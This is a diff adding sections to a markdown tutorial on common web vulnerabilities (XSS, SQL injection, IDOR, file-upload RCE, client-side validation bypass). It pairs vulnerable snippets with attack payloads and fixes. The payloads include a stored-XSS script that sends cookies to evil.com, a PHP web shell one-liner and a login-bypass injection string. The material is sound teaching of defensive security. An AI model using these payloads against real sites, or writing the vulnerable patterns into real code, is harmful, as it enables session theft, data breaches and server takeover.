@@ -152,3 +152,278 @@ Code that runs on the **web server**, not visible to users.
   * IDOR
 
 
+---
+
+## 🔴 1. DOM-Based XSS (Client-Side)
+
+![Image](https://miro.medium.com/1%2AyuRkBR6YroYLCGpka9KdRA.png)
+
+![Image](https://www.datocms-assets.com/85623/1762754967-dom-based-xss-via-innerhtml-sink.png?auto=format)
+
+![Image](https://miro.medium.com/v2/resize%3Afit%3A786/1%2AyuRkBR6YroYLCGpka9KdRA.png)
+
+### ❌ Vulnerable JavaScript
+
+```js
+const q = new URLSearchParams(location.search).get("q");
+document.getElementById("output").innerHTML = q;
+```
+
+### 🎯 Attack URL
+
+```
+https://victim.com/search?q=<img src=x onerror=alert(1)>
+```
+
+### 💥 What happens
+
+* Payload is **never sent to server**
+* Browser executes attacker input directly
+* JavaScript runs in victim’s session
+
+### 🧠 Real impact
+
+* Steal cookies
+* Account takeover
+* Credential phishing
+
+### 🛡️ Fix
+
+```js
+element.textContent = q;
+```
+
+---
+
+## 🔴 2. Reflected XSS (Server-Side)
+
+![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2016/03/reflected-cross-site-scripting-xss-attacks.png)
+
+![Image](https://portswigger.net/support/images/methodology_attacking_users_xss_reflected_5.png)
+
+![Image](https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png)
+
+### ❌ Vulnerable PHP
+
+```php
+echo "Welcome " . $_GET['name'];
+```
+
+### 🎯 Payload
+
+```
+https://site.com/?name=<script>alert(1)</script>
+```
+
+### 💥 What happens
+
+* Server reflects input in HTML
+* Browser executes injected JS
+
+### 🧠 Seen in:
+
+* Login error messages
+* Search pages
+* 404 handlers
+
+### 🛡️ Fix
+
+```php
+echo htmlspecialchars($_GET['name'], ENT_QUOTES);
+```
+
+---
+
+## 🔴 3. Stored XSS (Persistent)
+
+![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png)
+
+![Image](https://labsadmin.detectify.com/app/uploads/2017/01/html_comment_box3.jpg)
+
+![Image](https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png)
+
+### ❌ Scenario
+
+Comment stored in DB:
+
+```html
+<script>fetch('https://evil.com/c?='+document.cookie)</script>
+```
+
+### 💥 What happens
+
+* Stored in database
+* Executes for **every user**
+* Often hits admins
+
+### 🧠 Real-world targets
+
+* Blog comments
+* Chat systems
+* Support tickets
+
+### 🛡️ Fix
+
+* Output encoding
+* HTML sanitization
+* CSP headers
+
+---
+
+## 🔴 4. SQL Injection (Server-Side)
+
+![Image](https://portswigger.net/support/images/owasp_injection_10.png)
+
+![Image](https://teckk2.github.io/assets/images/Web%20Pentest/A1/100.png)
+
+![Image](https://whatismyipaddress.com/wp-content/uploads/37.jpg)
+
+### ❌ Vulnerable Query
+
+```sql
+SELECT * FROM users WHERE username='$u' AND password='$p';
+```
+
+### 🎯 Payload
+
+```
+username=admin'-- 
+password=anything
+```
+
+### 💥 What happens
+
+* Password check commented out
+* Login bypass
+
+### 🧠 Real impact
+
+* Full database dump
+* Admin access
+* Data breach
+
+### 🛡️ Fix
+
+```sql
+Prepared Statements / Parameterized Queries
+```
+
+---
+
+## 🔴 5. IDOR (Broken Access Control)
+
+![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2Aj8licN2V1DOxeu_x7tEyng.jpeg)
+
+![Image](https://sucuri.net/wp-content/uploads/2023/12/image02-jpg.webp)
+
+![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/6348192f8e2b1916df69dc17_464.3-min.jpg)
+
+### ❌ Request
+
+```
+GET /api/user/profile?id=102
+```
+
+### 🎯 Attack
+
+```
+GET /api/user/profile?id=101
+```
+
+### 💥 What happens
+
+* No ownership check
+* Attacker views another user’s data
+
+### 🧠 Seen in
+
+* Invoices
+* Profile pages
+* File downloads
+
+### 🛡️ Fix
+
+```text
+Verify object ownership on server
+```
+
+---
+
+## 🔴 6. File Upload → RCE
+
+![Image](https://www.vaadata.com/blog/wp-content/uploads/2022/03/RCE_vulnerability.png)
+
+![Image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2021/10/web-shell.png)
+
+![Image](https://appcheck-ng.com/wp-content/uploads/File-Upload-Vuln-Pic-4.png)
+
+### ❌ Weak Validation
+
+* Only checks extension
+* Uploads to web-root
+
+### 🎯 Payload
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Uploaded as:
+
+```
+shell.php.jpg
+```
+
+### 💥 Result
+
+```
+https://site.com/uploads/shell.php.jpg?cmd=id
+```
+
+### 🛡️ Fix
+
+* MIME validation
+* Random filenames
+* No execution permission
+
+---
+
+## 🔴 7. Client-Side Validation Bypass
+
+### ❌ HTML
+
+```html
+<input type="number" max="5">
+```
+
+### 🎯 Attack
+
+```http
+POST /order
+quantity=999
+```
+
+### 💥 What happens
+
+* Server trusts client
+* Logic abused
+
+### 🛡️ Fix
+
+> **Validate everything again on server**
+
+---
+
+## 🔥 Summary: Attacker Mindset
+
+| Area           | Common Exploit         |
+| -------------- | ---------------------- |
+| Client-side    | DOM XSS, logic bypass  |
+| Server-side    | SQLi, Stored XSS, IDOR |
+| Trust boundary | Client ≠ Trusted       |
+| Root cause     | Missing validation     |
+
+---
+
+
+
